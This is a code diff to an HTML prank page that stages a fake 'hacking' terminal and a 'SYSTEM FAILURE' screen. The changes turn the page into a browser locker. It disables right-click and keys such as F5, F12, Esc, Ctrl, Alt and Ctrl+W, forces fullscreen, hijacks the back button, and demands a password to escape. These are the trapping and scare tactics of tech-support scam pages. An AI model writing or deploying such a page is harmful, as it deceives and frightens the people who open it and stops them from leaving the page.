@@ -12,6 +12,8 @@
             font-size: 16px;
             padding: 20px;
             overflow: hidden;
+            user-select: none;
+            text-align: center;
         }
         #terminal {
             white-space: pre-line;
@@ -21,12 +23,28 @@
         .warning {
             color: red;
             font-weight: bold;
+            text-align: center;
+            font-size: 24px;
+            margin-top: 20%;
+        }
+        #passwordInput {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: black;
+            border: 1px solid lime;
+            color: lime;
+            font-size: 20px;
+            padding: 10px;
+            display: none;
         }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;" onkeydown="return disableKeys(event);">
     <div id="terminal">Initializing hack...
     </div>
+    <input type="password" id="passwordInput" placeholder="Enter Password" onkeydown="checkPassword(event)">
     <script>
         const messages = [
             "Accessing system files...",
@@ -42,6 +60,7 @@
 
         let index = 0;
         const terminal = document.getElementById("terminal");
+        const passwordInput = document.getElementById("passwordInput");
 
         function typeMessage() {
             if (index < messages.length) {
@@ -51,6 +70,8 @@
             } else {
                 setTimeout(() => {
                     document.body.innerHTML = '<h1 class="warning">SYSTEM FAILURE</h1>';
+                    passwordInput.style.display = 'block';
+                    passwordInput.focus();
                 }, 2000);
             }
         }
@@ -61,15 +82,52 @@
             document.onmousemove = function(event) {
                 event.preventDefault();
             };
-            document.onkeydown = function(event) {
+            document.ontouchmove = function(event) {
                 event.preventDefault();
             };
         }
-
         disableMouse();
 
+        function disableKeys(event) {
+            if ([116, 123, 27, 17, 18, 91].includes(event.keyCode) || (event.ctrlKey && [73, 85, 87, 83, 68].includes(event.keyCode))) {
+                event.preventDefault();
+                event.stopPropagation();
+                return false;
+            }
+        }
+        
+        function goFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) {
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+        
+        setTimeout(goFullscreen, 500);
+        
+        window.history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', function () {
+            window.history.pushState(null, null, document.URL);
+        });
+        
         let audio = new Audio('https://www.myinstants.com/media/sounds/windows-xp-error.mp3');
         setTimeout(() => { audio.play(); }, 3000);
+        
+        function checkPassword(event) {
+            if (event.key === 'Enter') {
+                if (passwordInput.value === '1111') {
+                    alert('System Restored!');
+                    location.reload();
+                } else {
+                    alert('Incorrect Password!');
+                }
+            }
+        }
     </script>
 </body>
 </html>
